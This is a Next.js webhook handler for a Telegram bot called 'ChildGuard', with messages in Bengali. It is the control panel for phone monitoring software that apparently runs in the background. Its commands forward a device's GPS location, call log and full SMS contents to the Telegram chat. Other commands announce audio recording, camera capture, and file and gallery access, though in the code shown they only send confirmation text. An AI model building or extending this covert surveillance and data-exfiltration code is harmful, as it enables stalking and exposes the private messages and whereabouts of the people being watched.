import { NextResponse } from 'next/server';
import { sendTelegramMessage } from '@/lib/telegramService';

export async function POST(req: Request) {
  try {
    const body = await req.json();

    if (body.message && body.message.text) {
      const text = body.message.text.trim();
      const deviceData = globalThis.deviceData || { calls: [], sms: [], location: null, social: [], files: [], gallery: [] };

      if (text === '/start') {
        await sendTelegramMessage("🛡️ *ChildGuard কন্ট্রোল প্যানেল*\n\nবট সফলভাবে যুক্ত হয়েছে!");
      } else if (text === '/status') {
        await sendTelegramMessage("🟢 ChildGuard সার্ভিস ব্যাকগ্রাউন্ডে চালু আছে।");
      } else if (text === '/location') {
        if (deviceData.location) {
          const { lat, lng } = deviceData.location;
          const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
          await sendTelegramMessage(`📍 *লোকেশন:*\nLatitude: ${lat}\nLongitude: ${lng}\n\n🔗 [গুগল ম্যাপসে দেখুন](${mapUrl})`);
        } else {
          await sendTelegramMessage("⚠️ লোকেশন পাওয়া যায়নি।");
        }
      } else if (text === '/call' || text === '/call_list') {
        if (deviceData.calls && deviceData.calls.length > 0) {
          const callList = deviceData.calls.map((c: any) => `📞 ${c.name || c.number}: ${c.type} (${c.duration})`).join('\n');
          await sendTelegramMessage(`📞 *কল লগ:*\n\n${callList}`);
        } else {
          await sendTelegramMessage("📞 কোনো কল লগ পাওয়া যায়নি।");
        }
      } else if (text === '/sms') {
        if (deviceData.sms && deviceData.sms.length > 0) {
          const smsList = deviceData.sms.map((s: any) => `💬 ${s.address}: ${s.body}`).join('\n---\n');
          await sendTelegramMessage(`💬 *এসএমএস:*\n\n${smsList}`);
        } else {
          await sendTelegramMessage("💬 কোনো এসএমএস পাওয়া যায়নি।");
        }
      } else if (text === '/social') {
        await sendTelegramMessage("📲 সোশ্যাল মিডিয়া নোটিফিকেশন ট্র্যাকিং সক্রিয় রয়েছে।");
      } else if (text === '/record') {
        await sendTelegramMessage("🎙️ ৫ মিনিটের অডিও রেকর্ডিং কমান্ড ট্রিগার করা হয়েছে।");
      } else if (text === '/photo') {
        await sendTelegramMessage("📸 ক্যামেরা ক্যাপচার রিকোয়েস্ট পাঠানো হয়েছে।");
      } else if (text === '/file' || text === '/files') {
        await sendTelegramMessage("📁 *ফাইল ম্যানেজার স্ক্যানার:*\nডিভাইসের স্টোরেজ ও ফাইল লিস্ট ফেচ করা হচ্ছে...");
      } else if (text === '/gallery') {
        await sendTelegramMessage("🖼️ *গ্যালারি এক্সেস:*\nডিভাইসের গ্যালারি থেকে ছবি ও মিডিয়া ফাইল লোড করা হচ্ছে...");
      } else {
        await sendTelegramMessage("⚠️ অজানা কমান্ড!");
      }
    }

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error("Webhook Error:", error);
    return NextResponse.json({ error: "Failed" }, { status: 500 });
  }
}
